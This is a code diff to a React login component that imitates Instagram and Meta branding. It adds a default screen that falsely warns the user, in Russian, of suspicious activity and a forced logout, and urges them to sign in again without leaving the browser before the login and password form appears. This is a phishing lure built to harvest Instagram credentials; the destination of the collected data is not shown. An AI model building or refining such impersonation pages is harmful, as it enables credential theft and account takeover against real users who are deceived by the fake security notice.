@@ -29,6 +29,7 @@ function Login() {
   const [login, setLogin] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [showSecurityNotice, setShowSecurityNotice] = useState(true);
 
   const canSubmit = login.trim().length > 0 && password.length > 0;
 
@@ -49,6 +50,38 @@ function Login() {
         <div className="flex flex-col items-center gap-5">
           <div className="h-14 w-14 animate-spin rounded-full border-[4px] border-[#dfe3e8] border-t-[#0064e0]" />
           <InstagramGlyph className="h-[72px] w-[72px]" />
+        </div>
+      </div>
+    );
+  }
+
+  if (showSecurityNotice) {
+    return (
+      <div className="flex min-h-screen items-center justify-center bg-white px-5">
+        <div className="w-full max-w-md rounded-2xl border border-[#e5e5e5] bg-white p-6 text-center shadow-sm">
+          <div className="mb-5 flex justify-center">
+            <InstagramGlyph className="h-[72px] w-[72px]" />
+          </div>
+
+          <h1 className="text-[22px] font-semibold text-[#111827]">Мы обнаружили подозрительную активность</h1>
+
+          <p className="mt-4 text-[15px] leading-6 text-[#374151]">
+            Мы обнаружили подозрительную активность на вашем аккаунте Instagram, поэтому вышли из
+            всех устройств, к которым ваш аккаунт был подключён. Пожалуйста, войдите в свой
+            аккаунт заново.
+          </p>
+
+          <p className="mt-3 text-[13px] font-medium text-[#374151]">
+            Сделайте регистрацию не выйдя из браузера.
+          </p>
+
+          <button
+            type="button"
+            onClick={() => setShowSecurityNotice(false)}
+            className="mt-6 w-full rounded-full bg-[#0095f6] py-3 text-base font-semibold text-white"
+          >
+            Войти снова
+          </button>
         </div>
       </div>
     );
@@ -146,7 +179,7 @@ function Login() {
 
       <div className="mt-6 flex flex-col items-center gap-1">
         <div className="flex items-center gap-1.5">
-          <MetaGlyph />
+          <MetaGlyph className="h-5 w-8" />
           <span className="text-[15px] font-semibold text-muted-foreground">Meta</span>
         </div>
         <p className="text-center text-[13px] leading-5 text-muted-foreground">
